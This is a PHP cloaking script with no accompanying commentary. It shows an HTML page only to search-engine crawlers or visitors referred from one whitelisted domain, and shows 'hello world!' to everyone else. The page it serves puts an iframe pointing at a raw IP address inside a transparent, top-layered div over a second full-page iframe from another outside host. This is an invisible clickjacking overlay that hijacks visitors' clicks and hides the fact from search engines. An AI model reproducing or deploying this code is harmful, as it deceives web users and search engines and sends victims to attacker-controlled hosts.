<?
$whiteList = array(
    'www.xyher.com',
);

$html= <<<HTML
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <title></title>
<script src="http://apps.bdimg.com/libs/jquery/1.8.3/jquery.min.js"></script>
<STYLE type=text/css>
<!--
/*.iframe {position: relative;z-index:1;top:-850px;}
.y{margin-top:-800x;}*/
-->

</STYLE>



<STYLE type=text/css>
<!--
.iframe2 {position: relative;z-index:1;top:0px;}
.y{margin-top:0x;}
-->

</STYLE>
</head>
<body>


<Div id="DivLocker" style="padding-top:235px;"><iframe class="iframe" src=http://117.41.229.172:888/temp/test.asp  align=center frameborder=no scrolling=no marginwidth="1" marginheight="1"  width="100%" height="200"  allowTransparency="true"  ></iframe></div>

<iframe class="iframe2" src=http://qussff.rousf.com align=center frameborder=0 scrolling=no marginwidth="1" marginheight="1"  width="100%" height="1000" ></iframe>


<script type="text/javascript">
      $('#DivLocker').css({
        "position": "absolute",
        "margin-left": "1px",
        "margin-top": "1px",
        "background-color": "#E6E6E6",
        "height": function () { return 250;//$(document).height();
		},
        "filter": "alpha(opacity=00)",
        "opacity": "0.0",
        "overflow": "hidden",
        "width": function () { return $(document).width(); },
        "z-index": "999"
    });
</script>

    </body>
</html>
HTML;

$fferUrl = '';
$httpReffer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
if(!empty($httpReffer)) {
    $parseUrl = parse_url($httpReffer);
    $fferUrl = $parseUrl['host'];

}
if(isCrawler() || in_array($fferUrl, $whiteList)) {
	echo $html;
} else {
	echo 'hello world!';
}
//echo '<br>'.strtolower($_SERVER['HTTP_USER_AGENT']);  
//echo '<br>'.get_ip();


/**
*    判断是否为搜索引擎蜘蛛
*
*    @author    Eddy
*    @return    bool
*/
function isCrawler() {
        $agent= strtolower($_SERVER['HTTP_USER_AGENT']);  
        if (!empty($agent)) {                 
                $spiderSite= array(
                        "TencentTraveler",
                        "Baiduspider+",
                        "BaiduGame",
                        "Googlebot",
                        "msnbot",
                        "Sosospider+",
                        "Sogou web spider",
                        "ia_archiver",
                        "Yahoo! Slurp",
                        "YoudaoBot",
                        "Yahoo Slurp",
                        "MSNBot",
                        "Java (Often spam bot)",
                        "BaiDuSpider",
                        "Voila",
                        "Yandex bot",
                        "BSpider",
                        "twiceler",
                        "Sogou Spider",
                        "Speedy Spider",
                        "Google AdSense",
                        "Heritrix",
                        "Python-urllib",
                        "Alexa (IA Archiver)",
                        "Ask",
                        "Exabot",
                        "Custo",
                        "OutfoxBot/YodaoBot",
                        "yacy",
                        "SurveyBot",
                        "legs",
                        "lwp-trivial",
                        "Nutch",
                        "StackRambler",
                        "The web archive (IA Archiver)",
                        "Perl tool",
                        "MJ12bot",
                        "Netcraft",
                        "MSIECrawler",
                        "WGet tools",
                        "larbin",
                        "Fish search",
						"360Spider",
                );   
                foreach($spiderSite as $val) {                        
                        $str = strtolower($val);
                        if (strpos($agent, $str) !== false) {
                                return true;
                        }                        
                }   
        } else {
                return false;
        } 
}

/**
 * get_ip 
 * 获取IP
 * @access public
 * @return void
 */
function get_ip()
{
	if (getenv('HTTP_CLIENT_IP') && strcasecmp(getenv('HTTP_CLIENT_IP'), 'unknown')) {
		$onlineip = getenv('HTTP_CLIENT_IP');
	} elseif (getenv('HTTP_X_FORWARDED_FOR') && strcasecmp(getenv('HTTP_X_FORWARDED_FOR'), 'unknown')) {
		$onlineip = getenv('HTTP_X_FORWARDED_FOR');
	} elseif (getenv('REMOTE_ADDR') && strcasecmp(getenv('REMOTE_ADDR'), 'unknown')) {
		$onlineip = getenv('REMOTE_ADDR');
	} elseif (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], 'unknown')) {
		$onlineip = $_SERVER['REMOTE_ADDR'];
	}

	preg_match("/[\d\.]{7,15}/", $onlineip, $onlineipmatches);
	$ip = $onlineipmatches[0] ? $onlineipmatches[0] : '';

	return $ip;
}

?>
